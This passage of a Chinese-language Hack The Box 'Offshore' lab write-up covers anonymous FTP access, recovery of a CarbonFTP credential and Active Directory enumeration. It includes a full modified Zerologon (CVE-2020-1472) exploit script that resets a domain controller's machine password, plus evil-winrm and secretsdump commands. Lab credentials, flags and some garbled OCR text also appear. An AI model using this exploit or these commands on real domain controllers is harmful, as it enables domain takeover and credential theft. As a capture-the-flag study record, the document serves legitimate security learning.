nxc smb 172.16.1.0/24 -u '' -p '' --shares 2>&1 | tee /tmp/shares_all.txt
```

发现新机子

172.16.1.26     FS01

扫一下（更新fscan）135，445

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-019.png)

这里需要<font style="color:#DF2A3F;background-color:#FBDE28;">一组凭据</font>才能横移，但是死活找不到，网上wp的还不对，看看别的域

# 2️⃣域JOE-LPTP：
| **<font style="color:#DF2A3F;">172.16.1.201</font>** | <font style="color:#DF2A3F;">JOE-LPTP（拿下ftp）</font> | **JOE-LAB** | 🔴 FTP+Web | 21, 80, 135, 139, 445 | **FTP匿名!    SmbGhost!** |
| --- | --- | --- | --- | --- | --- |


## JOE-LPTP：172.16.1.201-frp
FTP 匿名登录 .201

```plain
┌──(echoin㉿kali)-[/]
└─$ proxychains ftp anonymous@172.16.1.201 
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.201:21  ...  OK
Connected to 172.16.1.201.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||62718|)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.201:62718  ...  OK
125 Data connection already open; Transfer starting.
10-18-20  01:57PM       <DIR>          .dbus-keyrings
10-11-20  07:01PM       <DIR>          .vscode
10-10-20  10:13PM       <DIR>          3D Objects
10-10-20  10:13PM       <DIR>          Contacts
08-01-22  10:05PM       <DIR>          Desktop
10-18-20  01:57PM       <DIR>          Documents
04-17-21  10:03AM       <DIR>          Downloads
10-10-20  10:13PM       <DIR>          Favorites
10-10-20  10:13PM       <DIR>          Links
10-24-20  10:42AM       <DIR>          Music
10-22-20  05:31AM       <DIR>          OneDrive
10-11-20  06:52PM       <DIR>          Pictures
10-10-20  10:13PM       <DIR>          Saved Games
10-10-20  10:15PM       <DIR>          Searches
10-16-20  05:31PM       <DIR>          Videos
```

直接读flag没权限，get 前先切到可写的目录：

ftp> lcd /tmp

ftp> get flag.txt

ftp> !cat /tmp/flag.txt

```plain
ftp> cat flag.txt
?Invalid command.
ftp> get flag.txt
local: flag.txt remote: flag.txt
ftp: Can't access `flag.txt': 权限不够
ftp> lcd /tmp
Local directory now: /tmp
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||62720|)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.201:62720  ...  OK
125 Data connection already open; Transfer starting.
100% |***************************************************************************************************************|    31        0.02 KiB/s    00:00 ETAftp: Reading from network: 被中断的系统调用
  0% |                                                                                                               |    -1        0.00 KiB/s    --:-- ETA
226 Transfer complete.
ftp> !cat /tmp/flag.txt
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
OFFSHORE{st0p_us1ng_fr33warez!}ftp> 
```

flag3：OFFSHORE{st0p_us1ng_fr33warez!}

信息收集：

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-020.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-021.png)

下载下来

ctb 可能是 CherryTree，直接 strings

```plain
┌──(echoin㉿kali)-[~]
└─$ strings /tmp/infra_testing.ctb 2>/dev/null | head -50
SQLite format 3
tablebookmarkbookmark   CREATE TABLE bookmark (node_id INTEGER UNIQUE,sequence INTEGER)/
indexsqlite_autoindex_bookmark_1bookmark
/tablechildrenchildren
CREATE TABLE children (node_id INTEGER UNIQUE,father_id INTEGER,sequence INTEGER)/
indexsqlite_autoindex_children_1children
tableimageimage
CREATE TABLE image (node_id INTEGER,offset INTEGER,justification TEXT,anchor TEXT,png BLOB,filename TEXT,link TEXT,time INTEGER)
itablegridgrid
CREATE TABLE grid (node_id INTEGER,offset INTEGER,justification TEXT,txt TEXT,col_min INTEGER,col_max INTEGER)
tablecodeboxcodebox
CREATE TABLE codebox (node_id INTEGER,offset INTEGER,justification TEXT,txt TEXT,syntax TEXT,width INTEGER,height INTEGER,is_width_pix INTEGER,do_highl_bra INTEGER,do_show_linenum INTEGER)
Qtablenodenode
CREATE TABLE node (node_id INTEGER UNIQUE,name TEXT,txt TEXT,syntax TEXT,tags TEXT,is_ro INTEGER,is_richtxt INTEGER,has_codebox INTEGER,has_table INTEGER,has_image INTEGER,level INTEGER,ts_creation INTEGER,ts_lastsave INTEGER)'
indexsqlite_autoindex_node_1node
Internal testing<?xml version="1.0" encoding="UTF-8"?>
<node><rich_text>-Widespread exploitation of CVE-2020-1472 in the wild
-Server team unaware of the effects of immediately patching DCs in CORP, DEV, ADMIN, CLIENT - concerns with rushing an unknown patch
-Todd sent this article around: </rich_text><rich_text link="webs https://www.lares.com/blog/from-lares-labs-defensive-guidance-for-zerologon-cve-2020-1472/">https://www.lares.com/blog/from-lares-labs-defensive-guidance-for-zerologon-cve-2020-1472/</rich_text><rich_text>
        -Attack generates event code 5805, 4624, and 4742. Is responding to one of these events enough to prevent exploitation while we further test the patch?
        -What effects will running this have to combat successful exploitation? </rich_text><rich_text link="webs https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/reset-computermachinepassword?view=powershell-5.1">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/reset-computermachinepassword?view=powershell-5.1</rich_text><rich_text> 
-Mitigation </rich_text><rich_text style="italic">seems</rich_text><rich_text> to work for now
-Installed patch on SRV01
-Higher ups decided to push an emergency patch to all 4 DCs...
-Need to decommission domain before the auditors come in </rich_text></node>
custom-colors_
```

泄露的信息：

<u>CVE-2020-1472	Zerologon！DC 可能未打补丁</u>

<u>SRV01	已打补丁，但其他 DC "担心未知补丁风险"</u>

`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">infra_testing.ctb</font>`<u> 是 </u>**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">Carbon FTP 的 SQLite 配置数据库，sqlite3 infra_testing.ctb </font>**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">打开数据库</font>**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">  </font>**

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-022.png)

测试三个域 Zerologon

```plain
proxychains netexec smb 172.16.1.5 -M zerologon 2>&1
proxychains netexec smb 172.16.1.200 -M zerologon 2>&1  （成功）
proxychains netexec smb 172.16.1.220 -M zerologon 2>&1
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-023.png)

DC0 是 VULNERABLE，第三个域

### 🚩carbonftp 配置文件->加密凭据泄露
JOE-LPTP桌面上有Carbon FTP.lnk

**这是个FTP 客户端!FTP客户端的配置文件(AppData\Roaming\WeowiselCarbonFTP)通常保存着FTP 服务器地址和凭据**

<!-- 这是一张图片，ocr 内容为：?已深度思考(用时8.4秒) SUC-BACKUP:SUNMER2023)确认彻底无效(ONS修复后SMBMBMBMB/M55QL仍失败)--WP凭据在价环境接. 据! 深挖 JOE-LPTP的 APPDATA (CARBONFTP 配置) BASH FOR D IN ".DBUS-KEYRINGS" "APPDATA" "APPDATA/ROAMING" "DOCUMENTS" "DESKTOP"; DO "APPDATA/ROAMING/NEOWISE" "APPDATA/ROAMING/NEOWISE/CARBONFTP" "ONEDRIVE" /$D ECHO CURL -S "FTP://ANONYMOUS:ANONYMOUS@172.16.1.201/$D/" 2>&1 HEAD-20 DONE 的服务器很可能是内网某台! 这是真正新的方线索(GARBONFTP配置从没看过).如果找到配置.我们就知道JOE连的内网FTP服务跟是什么,用什么,把输出发我 -->
![](/img/htb/htb-offshore-024.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-025.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-026.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-027.png)

```plain
Server:  ftp.offshore.local
User:    joe
Password: 19852327402859129171335082736410993
```

flag6：OFFSHORE{An0N_FtP_c@n_rev3al_tr3asUre$}（我只能说这个flag太隐蔽了）

password用豆包解出来是 `Dev0ftheyear! ` -**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">Neowise CarbonFTP v1.4</font>**的密码加密漏洞（CVE-2020-6857）  

<font style="color:#DF2A3F;background-color:#FBDE28;">得到一组凭据： joe:Dev0ftheyear!</font>

在域**JOE-LAB的**JOE-LPTP：172.16.1.201里

得到一组凭据： joe:Dev0ftheyear!

joe是域用户

joe:Dev0ftheyear! 可能是 JOE-LPTP 的本地 Windows 登录密码

```plain
nxc smb 172.16.1.201 -u joe -p 'Dev0ftheyear!' --local-auth 2>&1 | tail -2
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-028.png)

对 <font style="color:#DF2A3F;">JOE-LPTP 本地认证成功</font>！ 但 joe 不是本地管理员（ADMIN$ 不可写）。但能 SMB 认证就能访问共享/文件

```plain
nxc smb 172.16.1.201 -u joe -p 'Dev0ftheyear!' --shares 2>&1 | tail -12
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-029.png)

但joe 是普通用户（无法写 C$/创建任务）

但IPC$可读：

IPC$ 可读有价值 —— 它是 RPC 通道，能枚举域信任关系、密码策略、域信息（这些是横向移动的关键）

```plain
rpcclient -U 'LAB.OFFSHORE.LOCAL/joe%Dev0ftheyear!' 172.16.1.200 -c \
  "querydominfo; enumdomtrust; getdompwinfo" 2>&1 | head -25
```

<font style="background-color:#FBDE28;">enumdomtrust 会列出 LAB 域信任的所有域</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-030.png)

**重要发现：LAB 域有 41 个用户**

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-031.png)

<font style="color:rgb(0, 0, 0);">但LAB 域只有 </font>**<font style="color:rgb(0, 0, 0);">5 个用户</font>**<font style="color:rgb(0, 0, 0);">（无其他隐藏账户）。目标很明确：</font>**<font style="color:rgb(0, 0, 0);">joe_adm / Administrator</font>**<font style="color:rgb(0, 0, 0);">。</font>

**<font style="color:rgb(0, 0, 0);">现在最关键的是 bloodhound 收集 LAB 域</font>**<font style="color:rgb(0, 0, 0);"> —— 它可能显示 </font>**<font style="color:rgb(0, 0, 0);">joe 对某个账户有 ACL 权限</font>**<font style="color:rgb(0, 0, 0);">（GenericAll/GenericWrite），那就是提权路径！</font>

检测 WinRM 是否可直接登录  

```plain
proxychains -q crackmapexec winrm 172.16.1.201 -u joe -p 'Dev0ftheyear!' -d LAB.OFFSHORE.LOCAL
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-032.png)

```plain
proxychains -q evil-winrm -i 172.16.1.201 -u 'LAB.OFFSHORE.LOCAL\joe' -p 'Dev0ftheyear!'
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-033.png)









### bloodhound 收集 LAB 域
```plain
bloodhound-python -d LAB.OFFSHORE.LOCAL -u joe -p 'Dev0ftheyear!' \
  -ns 172.16.1.200 --dns-tcp -c All --zip
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-034.png)

### 看攻击路径
<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-035.png)

**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">JOE_ADM@LAB.OFFSHORE.LOCAL</font>** 直接对域有 DCSync 权限  

**DC0和SRV01也直接对域有 DCSync 权限  **

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-036.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-037.png)

+ **<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">JOE_ADM 是 WORKSTATION ADMINS 的成员</font>**
+ **<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">WORKSTATION ADMINS 是 ADMINISTRATORS 的成员</font>**
+ **<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">WORKSTATION ADMINS 对 DC0 有 AdminTo 权限</font>**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">（直接登录域控当管理员）</font>
+ **<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">WORKSTATION ADMINS 有 DCSync 权限</font>**

<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">但是joe 没有任何直接提权路径（无出站 ACL，不在特权组）。攻击路径明确指向 joe_adm → DCSync</font>

所以要想办法拿到<font style="color:#DF2A3F;background-color:rgba(0, 0, 0, 0);"> joe_adm</font><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"> </font>

<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">现在的思路就是要么拿到joe的shell，再提权，要么就是直接打 joe_adm ，但是现在没有joe_adm的密码或凭据</font>

# 3️⃣**域LAB.OFFSHORE.LOCAL**
| **172.16.1.200** | DC0 | **LAB.OFFSHORE.LOCAL** | 🔴 DC | 88, 135, 139, 389, 445 |
| --- | --- | --- | --- | --- |
| **172.16.1.220** | SRV01 | **LAB.OFFSHORE.LOCAL** | 🔴 DC | 88, 135, 139, 389, 445 |


```plain
# ① 确认 joe 在 LAB 域的 SMB + 枚举共享
nxc smb 172.16.1.200 -u joe -p 'Dev0ftheyear!' -d LAB.OFFSHORE.LOCAL --shares 2>&1 | tail -5

# ② 对 LAB 域 DC0 和 SRV01 都测
nxc smb 172.16.1.200 172.16.1.220 -u joe -p 'Dev0ftheyear!' -d LAB.OFFSHORE.LOCAL --shares 2>&1 | grep -iE "\[.\]|shares|backup" | head -20
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-038.png)

**joe:Dev0ftheyear!    在 LAB.OFFSHORE.LOCAL 认证成功，能读 SYSVOL/NETLOGON**

 



 







## **DC0:172.16.1.200**
Zerologon  DC0 是 VULNERABLE

cve-2020-1472

```plain
# Step 1: 重置 DC0$ 密码为空
python3 /home/echoin/lab/CVE-2020-1472/cve-2020-1472-exploit.py DC0 172.16.1.200
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/htb/htb-offshore-039.png)

dc0密码置空了，但是没dump成功hash

分析cve-2020-1472-exploit.py：第 63 行是：request['ClearNewPassword'] = b'\x00' * 516    # 设空密码，把它改成 UTF-16LE 编码的已知密码就行。创建一个改良版 exploit：

```plain
cat > /tmp/zero_setpass2.py << 'PYEOF'
#!/usr/bin/env python3
from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5 import transport
import sys, struct
MAX_ATTEMPTS = 2000
def try_zero_auth(rpc_con, dc_handle, target):
    plaintext = b'\x00' * 8
    ciphertext = b'\x00' * 8
    flags = 0x212fffff
    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle+'\x00', target+'\x00', plaintext)
    try:
        server_auth = nrpc.hNetrServerAuthenticate3(
            rpc_con, dc_handle+'\x00', target+'$\x00',
            nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
            target+'\x00', ciphertext, flags)
        assert server_auth['ErrorCode'] == 0
        return True
    except nrpc.DCERPCSessionError as ex:
        if ex.get_error_code() == 0xc0000022: return None
        else: print(f'Err: {ex.get_error_code()}'); return False
def set_pass(dc_handle, rpc_con, target, password):
    request = nrpc.NetrServerPasswordSet2()
    request['PrimaryName'] = dc_handle + '\x00'
    request['AccountName'] = target + '$\x00'
    request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    a = nrpc.NETLOGON_AUTHENTICATOR()
    a['Credential'] = b'\x00' * 8; a['Timestamp'] = 0
    request['Authenticator'] = a
    request['ComputerName'] = target + '\x00'
    pw = password.encode('utf-16-le')
    # 512 bytes password + 4 bytes length field
    buf = pw + b'\x00' * (512 - len(pw)) + struct.pack('<I', len(pw))
    request['ClearNewPassword'] = buf
    return rpc_con.request(request)
def main():
    dc_name, dc_ip, new_pass = sys.argv[1], sys.argv[2], sys.argv[3]
    dc_h = '\\\\' + dc_name; t = dc_name.rstrip('$')
    binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
    rpc = transport.DCERPCTransportFactory(binding).get_dce_rpc()
    rpc.connect(); rpc.bind(nrpc.MSRPC_UUID_NRPC)
    print('Auth...')
    for i in range(MAX_ATTEMPTS):
        r = try_zero_auth(rpc, dc_h, t)
        if r is None: print('=', end='', flush=True)
        elif r: break
        else: sys.exit(1)
    print(f'\nSet pass: {new_pass}')
    for i in range(MAX_ATTEMPTS):
        try: result = set_pass(dc_h, rpc, t, new_pass)
        except nrpc.DCERPCSessionError as ex:
            if ex.get_error_code() == 0xc0000022: print('=', end='', flush=True); continue
            else: sys.exit(1)
        if result is None: print('=', end='', flush=True)
        else: break
    if result['ErrorCode'] == 0:
        print('\nSUCCESS!')
        print(f'Run: proxychains impacket-secretsdump "LAB.OFFSHORE.LOCAL/DC0\$:{new_pass}"@172.16.1.200')
        print(f'Or:  proxychains impacket-secretsdump LAB/DC0\$:{new_pass}@172.16.1.200')
    else: print(f'ErrCode: {result["ErrorCode"]}')
if __name__ == '__main__': main()
PYEOF
chmod +x /tmp/zero_setpass2.py
```

改DC0密码为P@ssw0rd123!

```plain
proxychains python3 /tmp/zero_setpass2.py DC0 172.16.1.200 'P@ssw0rd123!'
```

但是就是改不成功

















## 


